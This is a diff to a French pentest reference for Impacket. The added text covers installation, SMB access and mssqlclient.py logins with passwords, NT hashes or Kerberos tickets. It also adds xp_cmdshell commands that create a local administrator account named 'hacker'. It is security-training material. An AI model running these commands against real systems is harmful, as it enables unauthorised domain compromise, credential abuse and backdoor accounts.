@@ -1,6 +1,32 @@
 # Impacket : Référence complète
 
-> Suite d'outils Python pour l'exploitation des protocoles réseau Windows. La boîte à outils indispensable du pentesteur AD.
+> Suite d'outils Python pour l'exploitation des protocoles réseau Windows. C'est **la boîte à outils la plus utilisée** du pentest AD : exécution distante, dump de credentials, Kerberoasting, Golden Ticket, relay NTLM, RBCD.
+
+---
+
+## Vérification et installation
+
+```bash
+# Vérifier que c'est installé et voir la version
+pip3 show impacket
+
+# Trouver l'emplacement des scripts
+pip3 show impacket | grep Location
+
+# Vérifier que les scripts sont dans PATH
+which secretsdump.py psexec.py wmiexec.py 2>/dev/null \
+    || find / -name "secretsdump.py" 2>/dev/null | head -3
+
+# Installer ou mettre à jour si nécessaire
+pip3 install impacket --upgrade
+# OU depuis les sources (version la plus récente)
+git clone https://github.com/fortra/impacket /opt/impacket
+cd /opt/impacket && pip3 install .
+```
+
+!!! tip "Nommage des scripts"
+    Selon le mode d'installation, les scripts s'appellent `secretsdump.py` (pip3/source)
+    ou `impacket-secretsdump` (paquet apt Kali). Ce guide utilise la forme `.py`.
 
 ---
 
@@ -260,7 +286,7 @@ rbcd.py -delegate-from 'EVIL$' \
 
 ---
 
-## Accès aux partages
+## Accès aux partages et bases de données
 
 ### smbclient.py
 
@@ -268,6 +294,27 @@ rbcd.py -delegate-from 'EVIL$' \
 smbclient.py $DOMAIN/$USER:'$PWD'@$DC_IP
 smbclient.py -hashes :$NT_HASH $DOMAIN/$USER@$DC_IP
 smbclient.py -k $DOMAIN/$USER@$DC  # Kerberos
+```
+
+### mssqlclient.py : Shell interactif SQL Server
+
+Utile après un Silver Ticket ciblant un SPN `MSSQLSvc`, ou si des credentials de service SQL sont obtenus.
+
+```bash
+# Avec mot de passe
+mssqlclient.py $DOMAIN/$USER:'$PWD'@$TARGET_IP -windows-auth
+
+# Pass-the-Hash
+mssqlclient.py -hashes :$NT_HASH $DOMAIN/$USER@$TARGET_IP -windows-auth
+
+# Via ticket Kerberos (après Silver Ticket MSSQLSvc)
+export KRB5CCNAME=$PWD/Administrator.ccache
+mssqlclient.py -k Administrator@sql01.$DOMAIN_FQDN
+
+# Dans le shell SQL : exécuter des commandes OS
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami
+SQL> xp_cmdshell "net user hacker Password1! /add && net localgroup administrators hacker /add"
 ```
 
 ---
@@ -302,3 +349,4 @@ sudo timedatectl set-ntp false
 | `lookupsid.py` | Récupérer SID domaine | Pré-Golden Ticket |
 | `findDelegation.py` | Trouver délégations | Énumération |
 | `ldapdomaindump` | Dump LDAP | Énumération |
+| `mssqlclient.py` | Shell interactif MSSQL | Post-Silver Ticket |
